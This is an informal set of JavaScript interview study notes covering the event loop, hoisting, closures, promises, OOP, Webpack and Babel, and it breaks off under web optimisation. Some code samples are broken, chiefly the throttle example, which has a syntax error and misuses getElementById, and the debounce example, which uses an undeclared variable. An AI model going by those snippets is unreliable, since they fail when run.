
Javascript Important Topics:
- Event loop - How javascript run the code
- Hoisting
- Closures
- Event Bubbling & Capturing/Trickling
- Event Delegation
- Function Currying
- normal function vs arrow function
- pure function
- Scope
- Debouncing & Throttling
- call(), apply(), bind()
- Promise.race, Promise.any, Promise.all, Promise.allSettled
- Spread operator vs Rest Operator
- Array Destructuring 
- Map and Set data structures 
- WeakMap and WeakSet
- callbacks
- Prototype
- Shallow copy vs Deep copy
- ```javascript obj={};``` vs ```javascript Object.create({});```
- Generators
- map, filter, reduce polyfills
- Proxy class
- Decorators
- Webpack
- Babel
- Web API
- Responsive web design
- What will happen once a website is opened in the browser?
- Responsive web design principles and cross-browser compatibility
- Singleton Pattern, Module Pattern
- Design Patterns
- Unit Testing (Check React JS.txt file)
- Github commands
- Traffice signal: Change from red to yellow, yellow to green then again green to red for every 3 seconds 
- Input output questions with javascript code snippet 


Event loop:
- In JavaScript, an event loop is a mechanism that manages the execution of code by continuously monitoring the call stack and the message queue.
- Below website is to check event loop of code snippet in javascript
- Loupe JavaScript for event loop explanation
	- http://latentflip.com/loupe
	- https://www.youtube.com/watch?v=8aGhZQkoFbQ
- When an event occurs (such as a user clicking a button or a timer finishing), a corresponding event handler function is added to the message queue.
- The event loop then checks the call stack to see if there is any code currently being executed.
- If the call stack is empty, it takes the first function from the message queue and adds it to the call stack to be executed.

- The event loop operates on a single thread, which means that JavaScript can only execute one piece of code at a time. However, because the event loop is constantly monitoring the message queue and checking the call stack, it can handle multiple events and tasks asynchronously.
- This is why JavaScript is often referred to as a non-blocking language.


- The event loop is responsible for managing asynchronous operations by coordinating macrotasks and microtasks.
1. Macrotask Queue
- A macrotask (or just task) represents a unit of work like a script, setTimeout, or I/O operations.
- These tasks are queued in the macrotask queue. After each execution of a task, the event loop checks for other tasks in the macrotask queue before moving to microtasks.

**Examples of Macrotasks:**
- setTimeout
- setInterval
- setImmediate (Node.js)
- I/O operations (e.g., network requests)
- UI rendering and events

2. Microtask Queue
- A microtask is a smaller, faster task that typically takes priority over macrotasks.
- Microtasks are executed immediately after the currently running macrotask completes, but before the next macrotask begins.
- This ensures that microtasks (like promise resolution) are handled as soon as possible.

**Examples of Microtasks:**
- Promises (.then(), .catch(), .finally())
- MutationObserver
- queueMicrotask()
- process.nextTick()

- Microtasks have a higher priority than macrotasks.

Ex:
```javascript
console.log("Start");

// Macrotask
setTimeout(() => {
  console.log("Macrotask: Timeout");
}, 0);

// Microtask (Promise)
Promise.resolve().then(() => {
  console.log("Microtask: Promise");
});

console.log("End");
```

Output:
```
Start
End
Microtask: Promise
Macrotask: Timeout
```

**process.nextTick() vs setImmediate()**
- **process.nextTick()** executes before the next event loop tick, meaning it prioritizes callbacks and executes them right after the current operation completes, but before I/O operations, timers, or setImmediate callbacks.
- setImmediate() executes callbacks after the I/O operations are processed in the next event loop iteration.
- process.nextTick(): High-priority, runs before I/O and timer events.
- setImmediate(): Runs after I/O events but still in the same loop iteration.


Data Types
- Primitive Data Types: Data types which are predefined
	- String,Number,Boolean,Undefined,null
- Non-Primitive Data Types: Data types which are created by us means custom data types
	- To store multiple and complex values primitive data types will be used
	- Object, Array, RegExp
- Note: Any data type that is not primitive data type, is of Object type in javascript.

**null vs undefined**

| Aspect        | `undefined`                                  | `null`                                          |
|---------------|----------------------------------------------|-------------------------------------------------|
| **Meaning**   | Uninitialized or unknown value               | Explicitly no value                             |
| **Type**      | `undefined` (a primitive type)               | `object` (but treated as a primitive in practice) |
| **When Used** | When a variable hasn't been assigned a value | When you want to intentionally assign "no value" |
| **Default**   | Default for uninitialized variables           | Must be explicitly assigned                     |

**Hoisting:**
- Hoisting is a default behaviour of javascript where all the variable and function declarations are moved on top.
- **Note:** Variable initializations are not hoisted, only variable declarations are hoisted

- Hositing is a javascript default behaviour by which we can access the varaibles and functions even before we
have initialised it.

- With var, the declaration is hoisted but the assignment happens later, while with let and const, hoisting still occurs, but the variables remain in a "temporal dead zone" (TDZ) until they are initialized.
**let and const Hoisting Behavior**
- let and const are hoisted:
  - The declarations are hoisted to the top of their block scope (or script scope if outside of any block).
- **Temporal Dead Zone (TDZ):**
  - The Temoporal Dead Zone is the region of code where a variable is known to exist (because it is hoisted) but cannot yet be accessed because it hasn't been initialized.
  - The TDZ starts at the beginning of the block or scope where the variable is declared.
  - The TDZ ends when the variable is initialized.
  - The variable is in a TDZ from the start of the block until the line where it is initialized.
  - During this period, accessing the variable will throw a ReferenceError.
  - It applies to variables declared with let and const, but not to var.






- == is used to compare values
- === is used to compare values and types
- == (double equals) is the loose equality operator. It compares two values for equality after converting them to a common type, if necessary. This is called type coercion.
- === (triple equals) is the strict equality operator. It compares both the value and the type, without performing type conversion.

- Implicit type coercion in javascript is automatic conversion of value from one data type to another.
- It takes place when the operands of an expression are of different data types.

- JavaScript is a dynamically typed language and single threaded
- In a dynamically typed language, the type of a variable is checked during run-time
- In a statically typed language, where the type of a variable is checked during compile-time.

var, let, const:
- var declarations are function scoped
- let and const are block scoped
- var variables can be updated and re-declared within its scope
- var can be re-declared and re-assigned
- let cannot be re-declared and can be re-assigned
- const cannot be re-declared and cannot be re-assigned

- In JavaScript, var, let, and const are used to declare variables, but they have some differences in terms of scope and mutability:
- var: It is the oldest way to declare a variable in JavaScript. var is function scoped, meaning that it can be accessed from anywhere within the function it is declared in, including nested functions. However, var does not have block scope, which means that it can also be accessed outside the block it was declared in.

Example:
```javascript
function example() {
  var x = 1;
  if (true) {
    var x = 2;
    console.log(x); // Output: 2
  }
  console.log(x); // Output: 2
}
```

- let: Introduced in ECMAScript 6, let is also used to declare variables, but it is block-scoped. It can only be accessed within the block it was declared in, including nested blocks. let variables can be reassigned, but not redeclared.

Example:
```javascript
function example() {
  let x = 1;
  if (true) {
    let x = 2;
    console.log(x); // Output: 2
  }
  console.log(x); // Output: 1
}
```

- const: Also introduced in ECMAScript 6, const is used to declare constants. It is also block-scoped and cannot be reassigned or redeclared. However, if the constant is an object or an array, its properties can still be modified.

Example:
```javascript
function example() {
  const x = 1;
  if (true) {
    const x = 2;
    console.log(x); // Output: 2
  }
  console.log(x); // Output: 1
}
```

- cannot re-declare using let and const
- can re-declare using var
- cannot declare a variable using const without initialising with some value


Lexical scope
- A lexical scope in JavaScript means that a variable defined outside a function can be accessible inside another function defined after the variable declaration. But the opposite is not true; the variables defined inside a function will not be accessible outside that function.

Closures:
- A Closure is a function along with a lexical scope.
- In other words, Function along with its lexical scope bundled together forms a closure.
- A closure is a feature that allows a function to remember the variables and parameters of the outer function(s) that it was defined in, even after those outer functions have returned.

- To put it simply, a closure is created when a function is defined inside another function, and the inner function has access to the variables and parameters of the outer function, even after the outer function has completed its execution.

Example:
```javascript
function outerFunction() {
  let outerVariable = 'Hello';

  function innerFunction() {
    console.log(outerVariable);
  }

  return innerFunction;
}

let innerFunc = outerFunction();
innerFunc(); // Output: 'Hello'
```

- In this example, outerFunction() returns innerFunction(), which is assigned to the innerFunc variable. When innerFunc() is called, it still has access to the outerVariable defined in the outer function, even though outerFunction() has already completed execution.
```javascript
function x(){
	var a=100;
	function y(){
		console.log(a);
	}
	y();
}
x();

function x(){
	var a=100;
	function y(){
		console.log(a);
	}
	return y;
}
var z=x();
```

- Closures are commonly used in JavaScript to create private variables and methods, and to implement functional programming concepts like currying and partial application.

Uses of Closures:
- Function Currying
- setTimeOut
- Private Methods (protecting variables)

Difference between slice and splice?
- slice() and splice() are both methods that can be used to manipulate arrays in JavaScript, but they have different purposes and behaviors.

slice() method:
- The slice() method returns a shallow copy of a portion of an array into a new array object without modifying the original array.
- The original array is not changed.
- The syntax of the slice() method is array.slice(start, end), where start and end are optional parameters that specify the beginning and end of the slice respectively.
- If start is omitted, it is assumed to be 0. If end is omitted, the slice includes all elements from start to the end of the array.

Example:
```javascript
const fruits = ['apple', 'banana', 'cherry', 'orange', 'kiwi'];
const slicedFruits = fruits.slice(1, 3);

console.log(slicedFruits); // ['banana', 'cherry']
console.log(fruits); // ['apple', 'banana', 'cherry', 'orange', 'kiwi']
```

splice() method:
- The splice() method changes the contents of an array by removing or replacing existing elements and/or adding new elements in place.
- The original array is changed.
- The syntax of the splice() method is array.splice(start, deleteCount, item1, item2, ...), where start is the index at which to start changing the array, deleteCount is the number of elements to remove starting from the start index, and item1, item2, etc. are optional elements to be added to the array at the start index.
- If deleteCount is omitted or greater than the number of elements from start to the end of the array, all elements from start to the end of the array will be removed.

Example:
```javascript
const fruits = ['apple', 'banana', 'cherry', 'orange', 'kiwi'];
fruits.splice(1, 2, 'grape', 'mango');

console.log(fruits); // ['apple', 'grape', 'mango', 'orange', 'kiwi']
```
- In above example, splice() starts at index 1 and removes 2 elements ('banana' and 'cherry') and replaces them with 'grape' and 'mango'. The original array is changed.

- How to insert new value at the end of array using splice in javascript?
```javascript
const fruits = ['apple', 'banana', 'cherry'];
fruits.splice(fruits.length, 0, 'orange'); // insert 'orange' at the end of the array
console.log(fruits); // ['apple', 'banana', 'cherry', 'orange']
```

**Debouncing and Throttling:**
- These will be used for optimising the performance of a web app by limiting the rate of function calls.
**Debouncing:**
- For Rate limit of certain function calls which will fetch the data from API.
- Debouncing in JavaScript is a practice used to improve browser performance.
- There might be some functionality in a web page which requires time-consuming computations.
- If such a method is invoked frequently, it might greatly affect the performance of the browser, as JavaScript is a single threaded language.
- Debouncing is a programming practice used to ensure that time-consuming tasks do not fire so often, that it stalls the performance of the web page.
- In other words, it limits the rate at which a function gets invoked.
- In Debouncing, function call will happen when an event(Ex: Button click, search words) is stopped.
- On first click, debounce function will not call.
- In Throttling, function call will happen once after certain time Interval
- On first click, throttle function will call.

**Debouncing Example:**
```javascript
let counter=0;
const getApiData=()=>{
	console.log("Fetching API Data");
};
const debouncingFunction=(fn,delay)=>{
	let timer;
	return function(){
		let context=this;
		args=arguments;
		clearTimeout(timer);
		timer=setTimeout(()=>{
		   fn.apply(context,args); 
		},delay);
	}
}
const callDebounceFun = debouncingFunction(getApiData,300);
```

**Throttling Example:**
```javascript
const throttle = (fn,delay) => {
	let last = 0;
	return (..args) => {
		const now = new Date().getTime();
		if(now - last < delay){
		 return;
		}
		last = now;
		return fn(...args);
	}
}

document.getElementById("click",throttle(()=>{
 console.log("Clicked");
},5000));
```
	
	
- API calls in loop, suppose I want to send 5 files using API, Will it wait?
	- We can acheive this using Promise.all()

**Session Storage:**
- Data is persisted only for that particular session.
- Data will be lost once the user closes the browser window.
- In Session Storage, we can store atleast minimum of 5MB of data.

**Local Storage:
**- No expiry for data.
- Data will not be lost even the browser closes the window or event use shutdowns the system.
- It can store about 5-10MB

**Cookie:**
- size must be less than 4KB
	

**Responsive Web Design - The Viewport**
```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```


**Destructuring:**
- Destructuring assignment is a special syntax that allows us to “unpack” arrays or objects into a bunch of variables.



**what is difference between map, reduce and filter in javascript?**
- In JavaScript, map, reduce, and filter are three commonly used array methods. Here's a brief explanation of what they do:

1. map:
- The map method creates a new array with the results of calling a provided function on every element in the original array.
- In other words, map applies a function to each element of an array and returns a new array of the same length with the results.
- Here's an example that doubles each number in an array using map:
```javascript
const arr = [1, 2, 3, 4];
const doubledArr = arr.map(num => num * 2);
console.log(doubledArr); // Output: [2, 4, 6, 8]
```

2. reduce:
- The reduce method applies a function to each element of the array and "reduces" the array to a single value.
- The function takes two arguments: an accumulator and the current value.
- The accumulator is the value returned from the previous iteration of the function, and the current value is the current element of the array being processed.
- Here's an example that sums the elements of an array using reduce:
```javascript
const arr = [1, 2, 3, 4];
const sum = arr.reduce((acc, curr) => acc + curr, 0);
console.log(sum); // Output: 10
```
3. filter:
- The filter method creates a new array with all elements that pass the test implemented by the provided function.
- In other words, filter selects elements from an array that satisfy a condition and returns a new array with only those elements.
- Here's an example that filters out odd numbers from an array using filter:
```javascript
const arr = [1, 2, 3, 4];
const evenArr = arr.filter(num => num % 2 === 0);
console.log(evenArr); // Output: [2, 4]
```

**Difference between async and defer for script tag?**

**async:**
- If we use async in script tag, script will download from the network and will be executed along with DOM rendering.
- Script execution will happen in parallel to the DOM rendering.

**defer:**
- If we use defer in script tag, script will download from the network but script will be executed only when the DOM is fully rendered.


**call, apply, bind:**
- In JavaScript, call, apply, and bind are methods used to manipulate the "this" keyword and to pass arguments to functions in different ways.
Here are some examples of how they work:
**call:**
- The call method is used to call a function with a given "this" value and arguments provided individually.
Example:
```javascript
function greet() {
	console.log(`Hello, ${this.name}!`);
}

const person = { name: "John" };

greet.call(person); // outputs "Hello, John!"
```
- In the example above, we define a function "greet" that expects a "name" property to be present on the "this" object.
- We also define an object "person" with a "name" property. Then, we call the "greet" function with "call" and pass "person" as the "this" value.

**apply:**
- The apply method is similar to "call", but it accepts an array of arguments instead of individual arguments.
Example:
```javascript
function add(a, b) {
	console.log(a + b);
}

add.apply(null, [1, 2]); // outputs 3
```
- In the example above, we define a function add that expects two arguments. We call the add function with apply and pass an array of arguments [1, 2].

**bind:**
- The bind method is used to create a new function with a specified "this" value and arguments.
- It returns a new function that can be called later.
Example:
```javascript
function greet() {
	console.log(`Hello, ${this.name}!`);
}

const person = { name: "John" };
const greetPerson = greet.bind(person);

greetPerson(); // outputs "Hello, John!"
```
- In the example above, we define a function greet and an object person.
- We create a new function greetPerson using bind and pass person as the this value.
- We then call greetPerson, which outputs "Hello, John!".
	
- In summary, call, apply, and bind are useful methods to manipulate the "this" keyword and pass arguments to functions in different ways.


**Function Currying:**
- Function currying in JavaScript is a technique used to transform a function that takes multiple arguments into a series of functions that each take a single argument.
- This means that instead of passing all the arguments to a function at once, you can pass them one at a time, creating a new function for each argument.

For example, let's say you have a function that adds two numbers together:
```javascript
function add(a, b) {
	return a + b;
}
```
- Using currying, you can transform this function into a series of functions that each take a single argument:
```javascript
function add(a) {
	return function(b) {
		return a + b;
	}
}
```
- This new function takes the first argument a, and returns a new function that takes the second argument b, which then returns the result of a + b.
- You can then use this curried function to add numbers together like this:
		add(2)(3); // returns 5
- Here, we first call the add function with 2, which returns a new function that takes 3 as an argument, and returns the result of 2 + 3.
- This technique can be useful for creating reusable functions with default arguments, or for creating functions that can be partially applied.

**Promises:**
- In JavaScript, a promise is an object that represents a value that might not be available yet, but will be resolved in the future.
- It's a way to handle asynchronous operations in a more organized and intuitive way.
- Imagine you order a pizza, and the pizza delivery guy tells you that the pizza will be delivered in 30 minutes. You can think of the promise as the delivery guy's promise to bring you the pizza in 30 minutes.
- In JavaScript, a promise can be in one of three states:
	1. pending
 	2. fulfilled
	3. rejected.
- When a promise is pending, it means that the value it represents is not yet available.
- When a promise is fulfilled, it means that the value is available and the promise has been successfully resolved. When a promise is rejected, it means that an error occurred while trying to resolve the promise.

Example:
```javascript
fetch('https://example.com/data.json')
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error(error));
```

- In this example, fetch() returns a promise that represents the data that will be fetched from the remote server. The then() method is used to handle the case where the promise is fulfilled, and the catch() method is used to handle the case where the promise is rejected.
- When the promise is fulfilled, the response.json() method is called to extract the JSON data from the response, and then the data is logged to the console. If there's an error, the error is logged to the console.
- Overall, promises provide a powerful way to handle asynchronous operations in JavaScript in a more intuitive and organized way.

**Promises.all():**
- Promise.all() is a method that takes an array of promises as its argument and returns a new promise that resolves when all of the promises in the array have resolved.
- If any of the promises rejects, Promise.all() immediately rejects with that reason, and it doesn’t wait for the other promises to complete.
- The new promise resolves to an array of the resolved values from the original promises, in the order they were passed to Promise.all().
	
Example:
```javascript
const promise1 = Promise.resolve(1);
const promise2 = Promise.resolve(2);
const promise3 = Promise.resolve(3);

Promise.all([promise1, promise2, promise3])
.then(values => {
	console.log(values); // [1, 2, 3]
});
```

- In this example, we create three promises that resolve to the values 1, 2, and 3.
- We then pass an array of these promises to Promise.all().
- When all three promises have resolved, Promise.all() returns a new promise that resolves to an array of the resolved values ([1, 2, 3] in this case).
- We use the then() method to handle the resolution of the new promise and log the array of resolved values to the console.
- Note that if any of the promises in the array passed to Promise.all() are rejected, the new promise returned by Promise.all() will be rejected with the reason of the first rejected promise.
- In that case, the catch() method can be used to handle the rejection.

**promise.allSettled:**
- Takes an array (or iterable) of promises and returns a single promise.
- The returned promise fulfills when all of the input promises settle (either fulfilled or rejected).
- It never rejects. Instead, it returns an array of objects, where each object has either { status: "fulfilled", value: result } for fulfilled promises or { status: "rejected", reason: error } for rejected ones.
- Use Case: Useful when you want to know the outcome of all promises, regardless of whether they succeeded or failed.


**OOPs: (Refer OOPS.txt for better understanding of OOPS)**
- OOPS stands for Object-Oriented Programming.
- It is a programming style that emphasizes the use of objects to represent data and behavior.
- In JavaScript, OOPS can be implemented using a few key concepts(OCEIP):
Objects:
- An object is a collection of key-value pairs, where the keys are known as properties and the values can be of any data type, including other objects.
- Objects can be created using either the object literal syntax (using curly braces {}), or using the Object constructor.
**Classes:**
- In JavaScript, classes are a way of defining objects that share common properties and behaviors.
- A class is essentially a blueprint or template for creating objects.
- Classes can be defined using the class keyword, and can include methods and properties.
**Abstraction:**
- Abstraction is the process of hiding the implementation details of an object from the outside world, and only exposing a public interface for interacting with the object.
- This is typically achieved by using private and public methods and properties.
**Inheritance:**
- Inheritance is the process of creating new classes that are based on existing classes, and inheriting their properties and behaviors.
- This allows for code reuse and can help simplify the overall structure of a program.
**Polymorphism:**
- Polymorphism is the ability of an object to take on different forms or behaviors depending on the context in which it is used.
- This is typically achieved through the use of inheritance and method overriding.
**Encapsulation:**
- Encapsulation is the bundling of data and methods that operate on the data into a single unit.
- It allows us to bundle together data and the methods that operate on that data into a single unit (the class), and then control access to that unit.
  
- Overall, OOPS in JavaScript is a powerful way to organize and structure your code, making it easier to read, maintain, and extend over time.

Examples:
**1. Objects:**
  ```javascript
    // Object literal syntax
    const person = {
      name: "John",
      age: 30,
      address: {
        street: "123 Main St",
        city: "Anytown",
        state: "CA"
      }
    };

    // Object constructor
    const car = new Object();
    car.make = "Toyota";
    car.model = "Camry";
    car.year = 2020;
  ```
**2. Classes:**
```javascript
    class Person {
      constructor(name, age) {
        this.name = name;
        this.age = age;
      }
      
      greet() {
        console.log(`Hello, my name is ${this.name} and I'm ${this.age} years old.`);
      }
    }

    const john = new Person("John", 30);
    john.greet(); // logs "Hello, my name is John and I'm 30 years old."
  ```
3. Encapsulation:
```javascript
    class BankAccount {
      constructor(balance) {
        let _balance = balance; // private property
        
        this.getBalance = function() { // public method
          return _balance;
        };
        
        this.deposit = function(amount) { // public method
          _balance += amount;
        };
        
        this.withdraw = function(amount) { // public method
          if (_balance >= amount) {
            _balance -= amount;
          } else {
            console.log("Insufficient funds.");
          }
        };
      }
    }

    const account = new BankAccount(1000);
    console.log(account.getBalance()); // logs 1000
    account.deposit(500);
    console.log(account.getBalance()); // logs 1500
    account.withdraw(2000); // logs "Insufficient funds."
    console.log(account.getBalance()); // logs 1500
```

**5. Inheritance:**
```javascript
    class Animal {
      constructor(name) {
        this.name = name;
      }
      
      speak() {
        console.log(`${this.name} makes a noise.`);
      }
    }

    class Dog extends Animal {
      constructor(name) {
        super(name);
      }
      
      speak() {
        console.log(`${this.name} barks.`);
      }
    }

    const dog = new Dog("Rufus");
    dog.speak(); // logs "Rufus barks."
  ```
  **5. Polymorphism:**
  ```javascript
      class Shape {
        constructor() {
          this.color = "black";
        }
        
        draw() {
          console.log("Drawing a generic shape.");
        }
      }

      class Circle extends Shape {
        constructor() {
          super();
          this.radius = 10;
        }
        
        draw() {
          console.log(`Drawing a circle with radius ${this.radius} and color ${this.color}.`);
        }
      }

      class Square extends Shape {
        constructor() {
          super();
          this.width = 5;
          this.height = 5;
        }
        
        draw() {
          console.log(`Drawing a square with width ${this.width}, height ${this.height}, and color ${this.color}.`);
        }
      }

      const circle = new Circle();
      const square = new Square();

      const shapes = [circle, square];

      shapes.forEach(shape => {
        shape.draw();
      });
      // logs "Drawing a circle with radius 10 and color black."
      // logs "Drawing a square with width 5, height 5, and color black."
```

  - In the above code, super() is used inside the constructor method of the Dog class to call the constructor method of its parent class Animal.
  - The super() method allows the child class to inherit properties and methods from its parent class.
  - In this case, since Dog extends Animal, calling super(name) passes the name parameter up to the Animal constructor, which then sets the name property of the Dog object being created.
  - If a child class has its own constructor method, it must call super() before it can access this.
  - This ensures that the parent class constructor is called first and initializes the child class object with any properties and methods inherited from the parent class.
**6. Abstraction:**
```javascript
class Shape {
    constructor(color) {
	this.color = color;
    }

    // Abstract method
    draw() {
	throw new Error("Method 'draw()' must be implemented.");
    }
}

class Circle extends Shape {
    constructor(color, radius) {
	super(color);
	this.radius = radius;
    }

    // Implementation of abstract method
    draw() {
	console.log(`Drawing a ${this.color} circle with radius ${this.radius}`);
    }
}

class Square extends Shape {
    constructor(color, sideLength) {
	super(color);
	this.sideLength = sideLength;
    }

    // Implementation of abstract method
    draw() {
	console.log(`Drawing a ${this.color} square with side length ${this.sideLength}`);
    }
}

// Creating objects
let circle = new Circle("red", 5);
let square = new Square("blue", 4);

// Calling abstract method
circle.draw(); // Output: Drawing a red circle with radius 5
square.draw(); // Output: Drawing a blue square with side length 4
```

- In above example, the Shape class acts as an abstraction. It defines a method draw() as an abstract method, meaning it must be implemented by its subclasses (Circle and Square). Subclasses provide their own implementations of the draw() method, which allows them to hide the details of how they are drawn.

- This way, users of the Shape, Circle, and Square classes don't need to worry about the specific implementation details of drawing each shape. They can simply call the draw() method, knowing that each shape will be drawn appropriately according to its type. This is abstraction in action, where complex implementation details are hidden behind a simpler interface.


**My Understanding of OOPs:**
- Objects are collection of key value pairs
- Class is nothing but a blueprint or a template of an object which contains properties or methods
- Abstraction means hiding the implementation of an object
- Inheritance means creating classes using existing classes so that we can makes use of properties of parent classes
- Encapsulation means bundling of data(variables) and methods that operate on data within a single unit within an object or class.
- Polymorphism means the way of creating methods in different forms

**Promise.race:**
- Promise.race is a method in JavaScript that takes an iterable of promises (like an array) and returns a single promise.
- This returned promise resolves or rejects as soon as any of the promises in the iterable resolve or reject.
- In other words, it "races" all the promises and settles (either fulfilled or rejected) with the result of the first promise that settles.

**Example:**
```javascript
const promise1 = new Promise((resolve) => setTimeout(resolve, 500, 'one'));
const promise2 = new Promise((resolve) => setTimeout(resolve, 100, 'two'));

Promise.race([promise1, promise2]).then((value) => {
  console.log(value); // Logs: 'two' because promise2 resolves first
});
```

In above example:
- promise1 takes 500 milliseconds to resolve with the value 'one'.
- promise2 takes 100 milliseconds to resolve with the value 'two'.
- Since promise2 settles (resolves) first, Promise.race resolves with 'two'.

**Error Handling:**
```javascript
const promise1 = new Promise((resolve, reject) => setTimeout(reject, 500, 'error1'));
const promise2 = new Promise((resolve) => setTimeout(resolve, 100, 'success'));

Promise.race([promise1, promise2]).then((value) => {
  console.log(value); // Logs: 'success'
}).catch((error) => {
  console.log(error); // This won't execute since promise2 resolves first
});
```
- In this case, the race is won by promise2, so the rejection from promise1 is ignored. If the rejected promise wins the race, Promise.race would reject.

**Use Case:**
- Promise.race is commonly used when you want to take action based on the fastest response, regardless of whether the other promises have settled or not, such as timing out network requests or processing whichever operation completes first.

**Promise.any:**
- Promise.any is a method in JavaScript that takes an iterable of promises and returns a single promise.
- This returned promise fulfills as soon as any of the promises in the iterable fulfill.
- If none of the promises fulfill (i.e., if they all reject), it rejects with an AggregateError, which contains all the rejection reasons.

**Key Differences from Promise.race:**
- Promise.any only cares about the first fulfilled promise. It will ignore rejections unless all promises reject.
- If all promises reject, Promise.any will reject with an AggregateError, which is an error object that aggregates individual rejection reasons.

**Example:**
```javascript
const promise1 = new Promise((resolve, reject) => setTimeout(reject, 100, 'error1'));
const promise2 = new Promise((resolve) => setTimeout(resolve, 200, 'success'));
const promise3 = new Promise((resolve, reject) => setTimeout(reject, 300, 'error2'));

Promise.any([promise1, promise2, promise3]).then((value) => {
  console.log(value); // Logs: 'success' because it's the first fulfilled promise
}).catch((error) => {
  console.log(error); // Won't be called, since one promise resolves
});
```

**In above example:**
- promise1 and promise3 reject.
- promise2 fulfills after 200 milliseconds with the value 'success'.
- Promise.any resolves with the value 'success' because it is the first (and only) fulfilled promise.

When All Promises Reject:
- If all the promises reject, Promise.any will reject with an AggregateError that contains all the rejection reasons.
```javascript
const promise1 = new Promise((resolve, reject) => setTimeout(reject, 100, 'error1'));
const promise2 = new Promise((resolve, reject) => setTimeout(reject, 200, 'error2'));

Promise.any([promise1, promise2]).then((value) => {
  console.log(value); // This won't run, as all promises reject
}).catch((error) => {
  console.log(error.errors); // Logs: ['error1', 'error2']
});
```
Here:
- Both promise1 and promise2 reject, so Promise.any rejects with an AggregateError, and its errors property contains the reasons 'error1' and 'error2'.

**Use Case:**
- Promise.any is useful when you're interested in any successful result, even if there are multiple failures along the way. It can be applied to cases like fetching from multiple sources, where you only need one successful response, regardless of how many fail.


**Callbacks:**
- A callback is a function that is passed as an argument to another function and is executed after some operation or event has completed.
- Callbacks are commonly used in asynchronous programming to handle tasks that take some time to complete, such as I/O operations or network requests.

**Example:**
```javascript
// Function that performs an asynchronous operation and uses a callback
function fetchData(callback) {
    setTimeout(() => {
        // Simulate data fetching
        const data = 'Fetched data';
        callback(data); // Call the callback function with the fetched data
    }, 2000); // Simulate a delay of 2 seconds
}

// Callback function that handles the result
function handleData(data) {
    console.log('Data received:', data);
}

// Call fetchData and pass handleData as the callback
fetchData(handleData);
```


**Webpack:**
- Webpack is a popular open-source JavaScript module bundler.
- It is used to bundle and optimize code, including JavaScript, CSS, HTML, and other assets like images, for use in web applications.
- It is used to bundle JavaScript (and other web assets like HTML, CSS, and images) into a single file or a few files, depending on configuration.
- It’s especially useful for managing large applications with many modules and dependencies.
- Webpack is highly configurable and plays a crucial role in modern web development by helping developers manage dependencies, optimize code, and create production-ready builds.

**Why Use Webpack?**
- Bundling: Webpack bundles your application into a single file (or set of files), reducing the number of HTTP requests required to load your app.
- Code Splitting: It can split your code into chunks, allowing you to load only the code needed for the current page, improving performance.
- Tree Shaking: Webpack can automatically remove unused code from your final bundle, reducing its size.
- Development Experience: With features like hot module replacement and automatic reloading, Webpack makes it easier to develop and test applications.
- Asset Management: Webpack handles not just JavaScript but also CSS, images, and fonts, making it a comprehensive tool for web development.

**Babel:**
- Purpose: A JavaScript compiler.
- Functionality: Babel is primarily used to transpile JavaScript code from newer ECMAScript standards (like ES6+) down to ES5, which is supported by most browsers.

**Features:**
- Syntax Transformation: Converts new syntax (like arrow functions, classes) into syntax that older browsers can understand.
- Polyfilling: With the help of tools like @babel/preset-env, it can automatically include polyfills for features like Promises or Map.
- Plugins: Babel’s ecosystem has plugins for transforming JSX (for React) or TypeScript, as well as for adding experimental JavaScript features.
- Presets: Predefined sets of plugins and configurations for common use cases, like @babel/preset-env.

**How They Work Together?**
- Babel with Webpack: In many setups, Webpack uses Babel as a loader to transpile code before bundling it. For example, a typical React project uses Babel to convert JSX and modern JavaScript into compatible code, and Webpack bundles that code for deployment.

**Key Differences**
- Webpack is about bundling and managing assets, while Babel is about transpiling code.
- You can use Webpack without Babel if you don’t need to transpile your code, and you can use Babel without Webpack if you don’t need to bundle your assets.

In modern web development, they are often used together in the following workflow:
- Webpack uses Babel to transpile JavaScript files (e.g., ES6+ to ES5).
- Webpack bundles these files (along with other assets) into smaller chunks.
- The final output is optimized and ready for production.


**Shallow cooy vs Deep copy:**
**Shallow Copy**
- A shallow copy duplicates only the top-level properties of an object.
- For objects containing other objects (nested objects), a shallow copy only copies the reference to the inner objects, not the actual objects themselves. 
- This means that changes made to nested objects in the copy will also affect the original object.

**Examples of creating shallow copies:**
Using Object.assign():
```javascript
const original = { a: 1, b: { c: 2 } };
const shallowCopy = Object.assign({}, original);

shallowCopy.b.c = 42; 
console.log(original.b.c); // 42 (the original object is affected)
```

Using Spread Operator (...):
```javascript
const original = { a: 1, b: { c: 2 } };
const shallowCopy = { ...original };

shallowCopy.b.c = 42; 
console.log(original.b.c); // 42 (the original object is affected)
```
**Deep Copy**
- A deep copy duplicates all levels of an object, including nested objects. 
- This means that changes to the copied object do not affect the original object and vice versa.

Examples of creating deep copies:
Using JSON.stringify() and JSON.parse() (for simple objects without methods or circular references):
```javascript
const original = { a: 1, b: { c: 2 } };
const deepCopy = JSON.parse(JSON.stringify(original));

deepCopy.b.c = 42; 
console.log(original.b.c); // 2 (the original object is not affected)
```

**Spread vs Rest Operator**
**Spread Operator**
- The spread operator (...) is used to spread the elements of an array or object into individual elements. 
- It is often used for copying arrays/objects or combining them.

**Examples:**
In Arrays:
```javascript
const arr1 = [1, 2, 3];
const arr2 = [4, 5];
const combinedArr = [...arr1, ...arr2]; // [1, 2, 3, 4, 5]
```

In Objects:
```javascript
const obj1 = { a: 1, b: 2 };
const obj2 = { c: 3 };
const combinedObj = { ...obj1, ...obj2 }; // { a: 1, b: 2, c: 3 }
```
In function calls:
```javascript
function sum(a, b, c) {
  return a + b + c;
}

const numbers = [1, 2, 3];
sum(...numbers); // 6 (spreads the array elements as arguments)
```
**Rest Operator**
- The rest operator (...) is used to collect multiple elements into a single array or object. It is typically used in function parameters to handle an indefinite number of arguments.

**Examples:**
In function parameters:
```javascript
function sum(...numbers) {
  return numbers.reduce((acc, curr) => acc + curr, 0);
}

sum(1, 2, 3, 4); // 10 (collects all arguments into an array)
```

**In destructuring:**
```javascript
const [first, ...rest] = [1, 2, 3, 4];
console.log(first); // 1
console.log(rest);  // [2, 3, 4]
```

**Key Difference:**
- Spread is used to expand or unpack elements from arrays/objects.
- Rest is used to collect or pack multiple values into an array or object.

**How to optimise a web application?**
1. Minimize HTTP Requests
- Each element on a webpage (e.g., images, CSS, JavaScript files) requires an HTTP request, which slows down the loading time.

- Combine Files: Combine multiple CSS and JavaScript files into a single file.
- CSS Sprites: Combine multiple images into a single image and use CSS to display the correct parts.
- Lazy Loading: Load images, scripts, and other resources only when they are needed or come into view.

2. Minify and Compress Assets
